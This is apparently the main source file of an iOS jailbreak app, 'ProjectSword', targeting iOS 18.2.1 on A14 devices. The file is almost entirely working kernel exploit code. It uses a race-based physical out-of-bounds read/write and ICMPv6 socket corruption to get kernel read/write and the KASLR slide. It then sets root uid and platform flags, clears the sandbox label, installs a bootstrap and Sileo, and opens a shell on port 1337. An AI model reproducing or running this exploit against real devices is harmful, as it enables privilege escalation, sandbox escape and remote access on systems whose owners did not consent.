#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/fileport.h>
#include <pthread.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <spawn.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#import <IOSurface/IOSurfaceRef.h>
void IOSurfacePrefetchPages(IOSurfaceRef surface);

extern kern_return_t mach_vm_allocate(task_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(task_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(task_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#include "offsets.h"
#include "AppDelegate.h"

// ===== Global state =====
static uint64_t randomMarker;
static uint64_t wiredPageMarker;
static mach_port_t pcObject = MACH_PORT_NULL;
static mach_vm_address_t pcAddress = 0;
static mach_vm_size_t pcSize;
static int readFd, writeFd;
static NSMutableArray *socketPorts;
static NSMutableArray *socketPcbIds;
static int controlSocket = 0, rwSocket = 0;
static uint64_t controlSocketPcb = 0, rwSocketPcb = 0;
static uint8_t controlData[0x20];
static volatile uint8_t goSync = 0, raceSync = 0, freeThreadStart = 0;
static volatile uint8_t writeRequested = 0, writeDone = 0;
static volatile mach_vm_address_t freeTarget = 0;
static volatile mach_vm_size_t freeTargetSize = 0;
static volatile mem_entry_name_port_t targetObject = 0;
static volatile memory_object_offset_t targetObjectOffset = 0;
static pthread_t freeThread;
static pthread_t writeThread;
static int highestSuccessIdx = 0;
static int successReadCount = 0;
static struct iovec iov;
static char executablePath[PATH_MAX];
static const char *executableName;
static NSMutableDictionary *gMlockDict;

// Kernel state globals (used by all phases)
uint64_t gOurProc, gKernelProc, gOurTask, gKernelTask, gIS_TABLE;
uint64_t gOurPmap, gKernelPmap, gKernelBase, gKernelSlide;

// ===== Helpers =====
#define FAILURE(c) do { log_printf(@"[-] FAILURE at %s:%d\n", __FILE__, __LINE__); return; } while(0)

void c_log(const char *fmt, ...) {
    char buf[4096];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    log_printf(@"%s", buf);
}
#define printf(...) c_log(__VA_ARGS__)

void memset64(void *ptr, uint64_t val, size_t sz) {
    for (size_t i = 0; i < sz; i += 8)
        *(uint64_t*)((uint8_t*)ptr + i) = val;
}

// ===== DarkSword ICMP6 Socket Exploit =====

IOSurfaceRef create_surface_with_address(uint64_t address, uint64_t size) {
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        @"IOSurfaceAddress": @(address),
        @"IOSurfaceAllocSize": @(size)
    });
    IOSurfacePrefetchPages(surface);
    return surface;
}

void surface_mlock(uint64_t address, uint64_t size) {
    gMlockDict[@(address)] = (__bridge id)create_surface_with_address(address, size);
}

void surface_munlock(uint64_t address, uint64_t size) {
    IOSurfaceRef ref = (__bridge IOSurfaceRef)gMlockDict[@(address)];
    if (ref) {
        CFRelease(ref);
        [gMlockDict removeObjectForKey:@(address)];
    }
}

static void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *address, mach_vm_size_t size) {
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(size),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };

    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);

    if (!surface) {
        printf("[-] IOSurfaceCreate failed — falling back to pure Mach VM\n");
        kern_return_t kr = mach_vm_allocate(mach_task_self(), address, size,
            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        if (kr != KERN_SUCCESS) {
            printf("[-] mach_vm_allocate: %s\n", mach_error_string(kr));
            return;
        }
        memset64((void*)*address, randomMarker, size);
        kr = mach_make_memory_entry_64(mach_task_self(), &size, *address,
            VM_PROT_DEFAULT, port, 0);
        if (kr != KERN_SUCCESS) {
            printf("[-] mach_make_memory_entry_64: %s\n", mach_error_string(kr));
            mach_vm_deallocate(mach_task_self(), *address, size);
            return;
        }
        printf("[+] fallback bounce buffer: entry=%u va=0x%llx size=0x%llx\n", *port, *address, size);
        return;
    }

    void *physicalMappingAddress = IOSurfaceGetBaseAddress(surface);
    printf("[+] physicalMappingAddress: %p\n", physicalMappingAddress);

    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &size,
        (mach_vm_address_t)physicalMappingAddress, VM_PROT_DEFAULT, port, 0);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_make_memory_entry_64: %s\n", mach_error_string(kr));
        CFRelease(surface);
        return;
    }

    kr = mach_vm_map(mach_task_self(), address, size, 0,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, *port, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_map: %s\n", mach_error_string(kr));
        mach_port_deallocate(mach_task_self(), *port);
        CFRelease(surface);
        return;
    }

    CFRelease(surface);
    printf("[+] IOSurface bounce buffer: entry=%u va=0x%llx size=0x%llx\n", *port, *address, size);
}

static bool initialize_bounce_buffer(uint64_t size) {
    pcSize = size;
    create_physically_contiguous_mapping(&pcObject, &pcAddress, pcSize);
    if (!pcObject || !pcAddress) {
        printf("[-] create_physically_contiguous_mapping failed\n");
        return false;
    }
    memset64((void *)pcAddress, randomMarker, pcSize);
    freeTarget = pcAddress;
    freeTargetSize = pcSize;
    freeThreadStart = 1;
    goSync = 1;
    return true;
}

void init_target_file(void) {
    char rp[1024] = {}, wp[1024] = {};
    confstr(_CS_DARWIN_USER_TEMP_DIR, rp, 1024);
    confstr(_CS_DARWIN_USER_TEMP_DIR, wp, 1024);
    char rn[64], wn[64];
    snprintf(rn, sizeof(rn), "/%u", arc4random());
    snprintf(wn, sizeof(wn), "/%u", arc4random());
    strlcat(rp, rn, sizeof(rp));
    strlcat(wp, wn, sizeof(wp));
    void *c = calloc(1, 2 * PAGE_SIZE);
    FILE *f = fopen(rp, "w"); fwrite(c, 1, 2 * PAGE_SIZE, f); fclose(f);
    f = fopen(wp, "w"); fwrite(c, 1, 2 * PAGE_SIZE, f); fclose(f);
    free(c);
    readFd = open(rp, O_RDWR);
    writeFd = open(wp, O_RDWR);
    remove(rp); remove(wp);
    fcntl(readFd, F_NOCACHE, 1);
    fcntl(writeFd, F_NOCACHE, 1);
}

void *free_thread(void *arg) {
    (void)arg;
    while (freeThreadStart == 0) {}
    while (goSync == 0) {}
    while (goSync != 0) {
        while (raceSync == 0) {}
        mach_vm_map(mach_task_self(), (mach_vm_address_t*)&freeTarget, freeTargetSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, targetObject, targetObjectOffset, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        raceSync = 0;
    }
    return NULL;
}

void *write_thread_func(void *arg) {
    (void)arg;
    struct iovec wiov;
    wiov.iov_base = (void*)(pcAddress + 0x3f00);
    wiov.iov_len = OOB_OFFSET + OOB_SIZE;
    while (1) {
        while (writeRequested == 0) {}
        writeDone = 0;
        pwritev(readFd, &wiov, 1, 0x3f00);
        writeDone = 1;
    }
    return NULL;
}

fileport_t spray_socket(void) {
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd < 0) return -1;
    fileport_t port = 0;
    fileport_makeport(fd, &port);
    close(fd);
    void *info = calloc(1, 0x400);
    syscall(336, 6, getpid(), 3, port, info, 0x400);
    uint64_t gencnt = *(uint64_t*)((uintptr_t)info + 0x110);
    [(NSMutableArray*)socketPorts addObject:@(port)];
    [(NSMutableArray*)socketPcbIds addObject:@(gencnt)];
    free(info);
    return port;
}

void sockets_release(void) {
    while ([(NSMutableArray*)socketPorts lastObject]) {
        mach_port_deallocate(mach_task_self(),
            ((NSNumber*)[(NSMutableArray*)socketPorts lastObject]).unsignedIntValue);
        [(NSMutableArray*)socketPorts removeLastObject];
        [(NSMutableArray*)socketPcbIds removeLastObject];
    }
}

kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
                             mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    targetObject = memObj;
    targetObjectOffset = memOff;
    iov.iov_base = (void*)(pcAddress + 0x3f00);
    iov.iov_len = off + size;
    *(uint64_t*)buf = randomMarker;
    *(uint64_t*)(pcAddress + 0x3f00 + off) = randomMarker;
    for (int t = 0; t < highestSuccessIdx + 100; t++) {
        // Invert race: start write from OLD mapping (freed IOSurface pages)
        // THEN change mapping while write is in-flight
        writeRequested = 1;       // writer thread starts pwritev from freed pages
        raceSync = 1;             // free thread changes mapping DURING write
        while (writeDone == 0) {} // wait for writer completion
        while (raceSync == 1) {}  // wait for free thread completion
        kern_return_t kr = mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) return 1;
        pread(readFd, buf, size, 0x3f00 + off);
        if (*(uint64_t*)buf != randomMarker) {
            if (t > highestSuccessIdx) highestSuccessIdx = t;
            targetObject = 0;
            return KERN_SUCCESS;
        }
        writeRequested = 0;
        writeDone = 0;
        usleep(1);
        if (t == 500) break;
    }
    targetObject = 0;
    return 1;
}

kern_return_t phys_oob_read_retry(mach_port_t memObj, mach_vm_offset_t memOff,
                                    mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    kern_return_t kr;
    do { kr = phys_oob_read(memObj, memOff, size, off, buf); } while (kr != KERN_SUCCESS);
    return kr;
}

void phys_oob_write(mach_port_t memObj, mach_vm_offset_t memOff,
                     mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    targetObject = memObj;
    targetObjectOffset = memOff;
    iov.iov_base = (void*)(pcAddress + 0x3f00);
    iov.iov_len = off + size;
    pwrite(writeFd, buf, size, 0x3f00 + off);
    for (int t = 0; t < 20; t++) {
        raceSync = 1;
        preadv(writeFd, &iov, 1, 0x3f00);
        while (raceSync == 1) {}
        mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    }
    targetObject = 0;
}

void set_kaddr(uint64_t where) {
    memset(controlData, 0, 0x20);
    *(uint64_t*)controlData = where;
    setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, 0x20);
}

void early_kread(uint64_t where, void *buf, size_t size) {
    set_kaddr(where);
    socklen_t len = (socklen_t)size;
    getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, &len);
}

uint64_t kread64(uint64_t where) {
    uint64_t v = 0; early_kread(where, &v, 8); return v;
}

uint32_t kread32(uint64_t where) {
    uint32_t v = 0; early_kread(where, &v, 4); return v;
}

uint16_t kread16(uint64_t where) {
    uint16_t v = 0; early_kread(where, &v, 2); return v;
}

uint8_t kread8(uint64_t where) {
    uint8_t v = 0; early_kread(where, &v, 1); return v;
}

uint64_t kread_ptr(uint64_t where) { return kread64(where); }

void kread_buf(uint64_t where, void *buf, size_t size) {
    uint8_t *b = (uint8_t*)buf;
    while (size >= 8) {
        *(uint64_t*)b = kread64(where);
        where += 8; b += 8; size -= 8;
    }
    if (size) early_kread(where, b, size);
}

void kwrite64(uint64_t where, uint64_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint64_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite32(uint64_t where, uint32_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint32_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite16(uint64_t where, uint16_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint16_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite8(uint64_t where, uint8_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint8_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite_buf(uint64_t where, void *buf, size_t size) {
    uint8_t *b = (uint8_t*)buf;
    while (size >= 8) {
        kwrite64(where, *(uint64_t*)b);
        where += 8; b += 8; size -= 8;
    }
    if (size) {
        uint8_t tmp[0x20];
        early_kread(where, tmp, 0x20);
        memcpy(tmp, b, size);
        set_kaddr(where);
        setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmp, 0x20);
    }
}

int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
                             void *rBuf, void *wBuf, NSMutableArray *usedGc, bool doRead) {
    if (doRead) phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
    int si = 0; bool found = false; uint64_t pso = 0;
    void *hit;
    do {
        hit = memmem(rBuf + si, OOB_SIZE - si, executableName, strlen(executableName));
        if (hit) {
            pso = (uint64_t)hit - (uint64_t)rBuf & 0xFFFFFFFFFFFFFC00;
            if (*(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8)) {
                found = true;
                break;
            }
        }
        si += 0x400;
    } while (hit && si < OOB_SIZE);
    if (!found) return -1;

    uint64_t tg = *(uint64_t*)((uintptr_t)rBuf + pso + 0x78);
    if (tg == ((NSNumber*)[(NSMutableArray*)socketPcbIds lastObject]).unsignedLongLongValue)
        return -1;

    int csi = -1;
    for (int i = 0; i < [socketPorts count]; i++) {
        if ([(NSNumber*)socketPcbIds[i] unsignedLongLongValue] == tg) {
            csi = i; break;
        }
    }
    if (csi < 0 || [(NSMutableArray*)usedGc containsObject:@(tg)]) return -1;
    [usedGc addObject:@(tg)];

    uint64_t inpNext = *(uint64_t*)((uintptr_t)rBuf + pso + 0x28) - 0x20;
    rwSocketPcb = inpNext;
    memcpy(wBuf, rBuf, OOB_SIZE);
    *(uint64_t*)((uintptr_t)wBuf + pso + OFFSET_ICMP6FILT) = inpNext + OFFSET_ICMP6FILT;
    *(uint64_t*)((uintptr_t)wBuf + pso + OFFSET_ICMP6FILT + 8) = 0;

    while (1) {
        phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, wBuf);
        phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
        if (*(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT) == inpNext + OFFSET_ICMP6FILT)
            break;
    }

    int sock = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi] unsignedLongLongValue]);
    uint8_t gd[0x20]; socklen_t sl = 0x20;
    getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, gd, &sl);
    if (*(uint64_t*)gd != (uint64_t)-1) {
        controlSocket = sock;
        rwSocket = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi+1] unsignedLongLongValue]);
        return 0;
    }
    return -1;
}

bool run_darksword(void) {
    randomMarker = (uint64_t)arc4random() << 32 | arc4random();
    wiredPageMarker = (uint64_t)arc4random() << 32 | arc4random();
    successReadCount = 0;
    gMlockDict = [NSMutableDictionary new];
    printf("[+] randomMarker: 0x%016llx\n", randomMarker);
    init_target_file();
    uint32_t sz = PATH_MAX;
    _NSGetExecutablePath(executablePath, &sz);
    executableName = strrchr(executablePath, '/');
    if (executableName) executableName++;
    else executableName = executablePath;

    pthread_create(&freeThread, NULL, free_thread, NULL);
    pthread_create(&writeThread, NULL, write_thread_func, NULL);

    uint64_t mappingPages = 0x1000 * 0x10;
    uint64_t searchSize = 0x2000 * PAGE_SIZE;
    uint64_t totalSize = mappingPages * PAGE_SIZE;
    uint64_t mappingNum = totalSize / searchSize;

    void *rBuf = calloc(1, OOB_SIZE);
    void *wBuf = calloc(1, OOB_SIZE);
    if (!initialize_bounce_buffer(OOB_PAGES_NUM * PAGE_SIZE)) {
        printf("[-] initialize_bounce_buffer failed\n");
        free(rBuf); free(wBuf);
        return false;
    }

    NSMutableArray *usedGc = [NSMutableArray new];

    while (1) {
        NSMutableArray *mappings = [NSMutableArray new];
        for (uint64_t s = 0; s < mappingNum; s++) {
            mach_vm_address_t a = 0;
            mach_vm_allocate(mach_task_self(), &a, searchSize,
                VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            for (uint64_t k = 0; k < searchSize; k += PAGE_SIZE)
                *(uint64_t*)(a + k) = randomMarker;
            [mappings addObject:@(a)];
        }

        socketPorts = [NSMutableArray new];
        socketPcbIds = [NSMutableArray new];
        for (int i = 0; i < (10240 * 3 - 4096 * 2); i++) {
            if (spray_socket() == -1) break;
        }

        bool ok = false;
        for (uint64_t s = 0; s < mappingNum; s++) {
            mach_vm_address_t sma = [(NSNumber*)mappings[s] unsignedLongLongValue];
            mach_port_t memObj = 0;
            mach_vm_size_t mos = searchSize;
            mach_make_memory_entry_64(mach_task_self(), &mos, sma,
                VM_PROT_DEFAULT, &memObj, 0);
            surface_mlock(sma, searchSize);

            for (mach_vm_offset_t so = 0; so < searchSize; so += PAGE_SIZE) {
                if (phys_oob_read(memObj, so, OOB_SIZE, OOB_OFFSET, rBuf) == KERN_SUCCESS) {
                    if (find_and_corrupt_socket(memObj, so, rBuf, wBuf, usedGc, false) == 0) {
                        ok = true;
                        break;
                    }
                }
            }
            surface_munlock(sma, searchSize);
            mach_port_deallocate(mach_task_self(), memObj);
            if (ok) break;
        }

        sockets_release();
        for (uint64_t s = 0; s < mappingNum; s++) {
            mach_vm_deallocate(mach_task_self(),
                [(NSNumber*)mappings.lastObject unsignedLongLongValue], searchSize);
            [mappings removeLastObject];
        }

        if (ok) break;
    }

    goSync = 0; raceSync = 1;
    pthread_join(freeThread, NULL);
    close(writeFd); close(readFd);

    controlSocketPcb = kread64(rwSocketPcb + 0x20);
    uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
    uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
    if (!csa || !rsa) { log_printf(@"[-] No socket\n"); free(rBuf); free(wBuf); return false; }

    kwrite64(csa + OFFSET_SOCKET_SO_COUNT,
        kread64(csa + OFFSET_SOCKET_SO_COUNT) + 0x100010010001001ULL);
    kwrite64(rsa + OFFSET_SOCKET_SO_COUNT,
        kread64(rsa + OFFSET_SOCKET_SO_COUNT) + 0x100010010001001ULL);
    kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);

    uint64_t sp = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
    uint64_t pp = kread64(sp + OFFSET_SO_PROTO);
    uint64_t tp = kread64(pp + OFFSET_PR_INPUT);
    gKernelBase = tp & 0xFFFFFFFFFFFFC000;
    while (1) {
        uint64_t magic = kread64(gKernelBase);
        if ((magic & 0xFFFFFFFFFFFFFF) == 0x100000cfeedfacf &&
            kread64(gKernelBase + 8) == 0xc00000002) break;
        gKernelBase -= PAGE_SIZE;
    }
    gKernelSlide = gKernelBase - 0xfffffff007004000ULL;
    printf("[+] KASLR slide: 0x%llx\n", gKernelSlide);

    free(rBuf); free(wBuf);
    return true;
}

// ===== Kernel struct walking =====

uint64_t find_our_proc(void) {
    // Walk allproc list
    // allproc symbol is at known offset from kernel base
    // For xnu-11215: allproc ~ kernel_base + 0x___
    // We scan kernel data region for the allproc pointer
    uint64_t data_start = gKernelBase + 0x800000;
    uint64_t data_end   = gKernelBase + 0x900000;
    pid_t my_pid = getpid();

    for (uint64_t addr = data_start; addr < data_end; addr += 8) {
        uint64_t candidate = kread64(addr);
        if (candidate < 0xfffffff007000000ULL || candidate > 0xfffffff00f000000ULL)
            continue;
        // candidate looks like a proc pointer - check if it starts the allproc list
        uint64_t first_proc = kread64(candidate);
        if (first_proc < 0xfffffff007000000ULL || first_proc > 0xfffffff00f000000ULL)
            continue;
        uint32_t pid = kread32(first_proc + OFFSET_P_PID);
        if (pid == 0) {
            // found kernel proc - this IS allproc
            // walk to find our proc
            uint64_t proc = first_proc;
            while (proc) {
                if (kread32(proc + OFFSET_P_PID) == (uint32_t)my_pid)
                    return proc;
                proc = kread_ptr(proc); // le_next
            }
        }
    }
    return 0;
}

uint64_t get_task_from_proc(uint64_t proc) {
    return kread_ptr(proc + OFFSET_P_TASK);
}

uint64_t get_ucred_from_proc(uint64_t proc) {
    return kread_ptr(proc + OFFSET_P_UCRED);
}

// ===== Platformize (no PPL needed — task flags + uid in non-PPL memory) =====

bool platformize_proc(void) {
    gOurProc = find_our_proc();
    if (!gOurProc) {
        printf("[-] Cannot find our proc\n");
        return false;
    }
    gOurTask = get_task_from_proc(gOurProc);
    if (!gOurTask) {
        printf("[-] Cannot find our task\n");
        return false;
    }

    printf("[+] Our proc: 0x%llx\n", gOurProc);
    printf("[+] Our task: 0x%llx\n", gOurTask);

    // 1. Set TF_PLATFORM in task->t_flags
    uint32_t t_flags = kread32(gOurTask + OFFSET_TASK_T_FLAGS);
    printf("[*] Task flags before: 0x%x\n", t_flags);
    if (!(t_flags & TF_PLATFORM)) {
        t_flags |= TF_PLATFORM;
        kwrite32(gOurTask + OFFSET_TASK_T_FLAGS, t_flags);
        printf("[+] TF_PLATFORM set: 0x%x\n", kread32(gOurTask + OFFSET_TASK_T_FLAGS));
    }

    // 2. Set uid 0 in proc and ucred
    uint32_t uid_now = kread32(gOurProc + OFFSET_P_UID);
    printf("[*] Current uid: %d\n", uid_now);
    if (uid_now != 0) {
        kwrite32(gOurProc + OFFSET_P_UID, 0);
        kwrite32(gOurProc + OFFSET_P_RUID, 0);
        kwrite32(gOurProc + OFFSET_P_SVUID, 0);
        printf("[+] uid set to 0\n");

        uint64_t ucred = get_ucred_from_proc(gOurProc);
        if (ucred) {
            kwrite32(ucred + OFFSET_CR_UID, 0);
            kwrite32(ucred + OFFSET_CR_RUID, 0);
            kwrite32(ucred + OFFSET_CR_SVUID, 0);
            printf("[+] ucred uid set to 0\n");
        }
    }

    return true;
}

// ===== Sandbox escape via MAC label manipulation =====

bool escape_sandbox(void) {
    uint64_t ucred = get_ucred_from_proc(gOurProc);
    if (!ucred) {
        printf("[-] No ucred\n");
        return false;
    }

    printf("[+] ucred: 0x%llx\n", ucred);

    // Read MAC label pointer from ucred
    uint64_t cr_label = kread_ptr(ucred + OFFSET_CR_LABEL);
    printf("[*] cr_label: 0x%llx\n", cr_label);
    if (!cr_label) {
        printf("[*] No MAC label, sandbox may already be disabled\n");
        return true;
    }

    // Read the sandbox struct from the MAC label
    uint64_t sandbox = kread_ptr(cr_label + OFFSET_LABEL_SANDBOX);
    printf("[*] sandbox: 0x%llx\n", sandbox);

    if (sandbox) {
        // Zero out the sandbox slot to disable
        kwrite64(cr_label + OFFSET_LABEL_SANDBOX, 0);
        printf("[+] Sandbox slot cleared\n");

        // Also try clearing the entire label structure's relevant fields
        // On iOS 18, MAC label has multiple slots, we clear the sandbox slot
        uint64_t sanity = kread_ptr(cr_label + OFFSET_LABEL_SANDBOX);
        if (sanity == 0) {
            printf("[+] Sandbox escape confirmed\n");
        }
    }

    return true;
}

// ===== Bootstrap installation =====

static const char *jb_path = "/private/preboot/jb";
static const char *jb_var = "/var/jb";

static int mkdir_p(const char *path, mode_t mode) {
    char tmp[4096];
    strncpy(tmp, path, sizeof(tmp) - 1);
    for (char *p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = 0; mkdir(tmp, mode); *p = '/';
        }
    }
    return mkdir(tmp, mode);
}

bool setup_jb_symlink(void) {
    unlink(jb_var);
    if (symlink(jb_path, jb_var) != 0) {
        printf("[-] symlink: %s\n", strerror(errno));
        return false;
    }
    printf("[+] %s -> %s\n", jb_var, jb_path);
    return true;
}

bool install_bootstrap(void) {
    struct stat st;
    if (stat(jb_path, &st) != 0) {
        if (mkdir_p(jb_path, 0755) != 0) {
            printf("[-] mkdir %s: %s\n", jb_path, strerror(errno));
            return false;
        }
    }

    char self_path[4096] = {};
    uint32_t size = sizeof(self_path);
    if (_NSGetExecutablePath(self_path, &size) != 0) return false;
    char *slash = strrchr(self_path, '/');
    if (!slash) return false;
    *slash = 0;

    char tar_path[4096];
    snprintf(tar_path, sizeof(tar_path), "%s/bootstrap.tar", self_path);
    if (stat(tar_path, &st) != 0) {
        printf("[-] No bootstrap.tar at %s\n", tar_path);
        printf("[*] Creating bootstrap directory structure manually\n");
        // Create minimal bootstrap
        mkdir_p("/private/preboot/jb/usr/bin", 0755);
        mkdir_p("/private/preboot/jb/usr/lib", 0755);
        mkdir_p("/private/preboot/jb/Applications", 0755);
        mkdir_p("/private/preboot/jb/etc", 0755);
        mkdir_p("/private/preboot/jb/Library", 0755);
        setup_jb_symlink();
        return true;
    }

    // We have a bootstrap.tar, extract it
    const char *argv[] = {
        "tar",
        "--preserve-permissions",
        "-xkf",
        tar_path,
        "-C",
        jb_path,
        NULL
    };

    // Use posix_spawn to run tar
    // We need to spawn as root/unsandboxed
    // For now, try direct spawn
    pid_t pid;
    int ret = posix_spawnp(&pid, "/usr/bin/tar", NULL, NULL,
        (char *const *)argv, NULL);
    if (ret != 0) {
        printf("[-] tar spawn: %s\n", strerror(ret));
        return false;
    }
    int status;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        printf("[+] Bootstrap extracted to %s\n", jb_path);
    } else {
        printf("[-] tar exit: %d\n", WEXITSTATUS(status));
    }

    setup_jb_symlink();

    // Load trust caches from bootstrap
    char tc_path[4096];
    snprintf(tc_path, sizeof(tc_path), "%s/TrustCache", jb_path);
    if (stat(tc_path, &st) == 0) {
        printf("[*] Trust cache found at %s\n", tc_path);
        // TODO: load trust cache entries via kread/kwrite
    }

    return true;
}

bool install_sileo(void) {
    char sileo_path[4096];
    snprintf(sileo_path, sizeof(sileo_path), "%s/Applications/Sileo.app", jb_path);
    struct stat st;
    if (stat(sileo_path, &st) != 0) {
        printf("[-] Sileo.app not found\n");
        return false;
    }

    char uicache_path[4096];
    snprintf(uicache_path, sizeof(uicache_path), "%s/usr/bin/uicache", jb_path);
    const char *args[] = {"uicache", "-p", sileo_path, NULL};
    pid_t pid;
    int ret;
    if (stat(uicache_path, &st) == 0) {
        ret = posix_spawnp(&pid, uicache_path, NULL, NULL,
            (char *const *)args, NULL);
    } else {
        ret = posix_spawnp(&pid, "/usr/bin/uicache", NULL, NULL,
            (char *const *)args, NULL);
    }
    if (ret != 0) {
        printf("[-] uicache: %s\n", strerror(ret));
        return false;
    }
    int status;
    waitpid(pid, &status, 0);
    printf("[+] Sileo registered\n");
    return true;
}

// ===== Shell-command stubs =====
bool load_trust_cache(const char *tc_path) {
    printf("[*] load_trust_cache(%s) - requires TC injection\n", tc_path);
    (void)tc_path;
    return false;
}

bool remount_private_preboot(void) {
    // Try to remount via mount() syscall
    int ret = mount("apfs", "/private/preboot", MNT_UPDATE, NULL);
    if (ret != 0) {
        printf("[-] mount -u /private/preboot: %s\n", strerror(errno));
        return false;
    }
    printf("[+] /private/preboot remounted r/w\n");
    return true;
}

// ===== Shell =====
#include "shell.h"

// ===== Main Jailbreak Flow =====

void run_jailbreak(void) {
    @autoreleasepool {
        printf("=== ProjectSword - iOS 18.2.1 A14 ===\n\n");

        // Phase 1: Kernel R/W via DarkSword (ICMP6 socket)
        printf("[Phase 1] DarkSword ICMP6 kernel exploit...\n");
        if (!run_darksword()) {
            printf("[-] DarkSword failed\n");
            return;
        }
        printf("[+] Kernel R/W via ICMP6 sockets\n\n");

        // Phase 2: Platformize (set TF_PLATFORM + root)
        printf("[Phase 2] Platformize...\n");
        if (platformize_proc()) {
            printf("[+] Platformized (TF_PLATFORM + uid 0)\n\n");
        } else {
            printf("[-] Platformize failed\n");
            return;
        }

        // Phase 3: Sandbox escape
        printf("[Phase 3] Sandbox escape...\n");
        if (escape_sandbox()) {
            printf("[+] Sandbox escaped\n\n");
        } else {
            printf("[-] Sandbox escape failed\n");
        }

        // Phase 4: Bootstrap
        printf("[Phase 4] Bootstrap...\n");
        install_bootstrap();
        printf("\n");

        // Phase 5: Sileo
        printf("[Phase 5] Sileo...\n");
        install_sileo();
        printf("\n");

        printf("=== Jailbreak Ready ===\n");
        printf("uid: %d  (should be 0)\n", getuid());
        printf("Kernel base: 0x%llx\n", gKernelBase);
        printf("Kernel slide: 0x%llx\n\n", gKernelSlide);

        printf("Starting shell on port 1337...\n");
        start_shell(1337);
    }
}

// ===== Entry Point =====
int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}

#pragma clang diagnostic pop
